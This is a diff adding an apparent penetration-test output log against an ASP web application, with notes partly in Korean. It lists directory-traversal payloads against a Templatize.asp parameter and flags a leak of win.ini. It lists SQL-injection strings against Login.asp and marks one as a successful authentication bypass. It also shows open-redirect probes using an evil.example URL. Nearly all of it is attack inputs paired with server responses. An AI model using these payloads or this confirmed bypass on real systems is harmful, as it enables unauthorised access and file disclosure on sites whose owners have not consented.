@@ -1,0 +1,50 @@
+==========================================================================================
+### 1. /Templatize.asp?item= — directory traversal
+  baseline html/about.html            -> HTTP/1.1 200 OK len=4764 sha=d786b676a3
+  html/about.html                            -> HTTP/1.1 200 OK                len=  4768
+  ../web.config                              -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../../web.config                           -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../../../web.config                        -> HTTP/1.1 500 Internal Server Error len=  1433
+  ..%2fweb.config                            -> HTTP/1.1 500 Internal Server Error len=  1433
+  %2e%2e%2fweb.config                        -> HTTP/1.1 500 Internal Server Error len=  1433
+  %2e%2e/%2e%2e/web.config                   -> HTTP/1.1 500 Internal Server Error len=  1433
+  ..%5cweb.config                            -> HTTP/1.1 500 Internal Server Error len=  1433
+  ..\web.config                              -> HTTP/1.1 500 Internal Server Error len=  1433
+  ....//web.config                           -> HTTP/1.1 500 Internal Server Error len=  1433
+  ..%252fweb.config                          -> HTTP/1.1 500 Internal Server Error len=  1433
+  %2e%2e%252fweb.config                      -> HTTP/1.1 500 Internal Server Error len=  1433
+  html/../web.config                         -> HTTP/1.1 200 OK                len=  3358
+  html/../../web.config                      -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../global.asa                              -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../../global.asa                           -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../Templates/MainTemplate.dwt.asp          -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../Default.asp                             -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../Login.asp                               -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../../../../../../../../windows/win.ini    -> HTTP/1.1 200 OK                len=  3062  🎯 WIN.INI LEAK
+  ..%2f..%2f..%2f..%2f..%2fwindows/win.ini   -> HTTP/1.1 500 Internal Server Error len=  1433
+  C:\Windows\win.ini                         -> HTTP/1.1 500 Internal Server Error len=  1433
+  /etc/passwd                                -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../../../../etc/passwd                     -> HTTP/1.1 500 Internal Server Error len=  1433
+  %00/about.html                             -> HTTP/1.1 500 Internal Server Error len=  1433
+  html/about.html%00.txt                     -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../showforum.asp                           -> HTTP/1.1 500 Internal Server Error len=  1433
+  ../styles.css                              -> HTTP/1.1 500 Internal Server Error len=  1433
+
+==========================================================================================
+### 2. /Login.asp — 로그인 실패 기준선 + 인증 우회 시도
+  [기준] 잘못된 자격증명              -> HTTP/1.1 200 OK len=3330 sha=ed78dc4c82
+        실패 메시지 후보: ['']
+  tfUName=' OR '1'='1&tfUPass=x                -> HTTP/1.1 200 OK                len=  3330 DIFF
+  tfUName=admin'--&tfUPass=x                   -> HTTP/1.1 302 Object moved      len=   332 DIFF  ⚠ 실패문구 없음
+  tfUName=' OR 1=1--&tfUPass=x                 -> HTTP/1.1 500 Internal Server Error len=  1367 DIFF  ⚠ 실패문구 없음
+  tfUName=admin&tfUPass=' OR '1'='1            -> HTTP/1.1 302 Object moved      len=   332 DIFF  ⚠ 실패문구 없음
+  tfUName=' OR '1'='1'--&tfUPass=x             -> HTTP/1.1 302 Object moved      len=   332 DIFF  ⚠ 실패문구 없음
+  tfUName=admin' OR '1'='1&tfUPass=x           -> HTTP/1.1 302 Object moved      len=   332 DIFF  ⚠ 실패문구 없음
+  tfUName=' OR 1=1 AND ''='&tfUPass=x          -> HTTP/1.1 500 Internal Server Error len=  1367 DIFF  ⚠ 실패문구 없음
+  tfUName=x' OR 'x'='x&tfUPass=x               -> HTTP/1.1 200 OK                len=  3269 DIFF  🎯 로그아웃 링크 발견 → 인증 우회 성공
+
+### 3. RetURL 반사/사용 여부
+  RetURL=http://example.com       -> HTTP/1.1 200 OK len=3257  본문에 없음(서버측에서만 사용되는 듯)
+  RetURL=//example.com            -> HTTP/1.1 200 OK len=3250  본문에 없음(서버측에서만 사용되는 듯)
+  RetURL=%2F%2Fexample.com        -> HTTP/1.1 200 OK len=3250  본문에 없음(서버측에서만 사용되는 듯)
+  RetURL=https://evil.example     -> HTTP/1.1 200 OK len=3259  본문에 없음(서버측에서만 사용되는 듯)
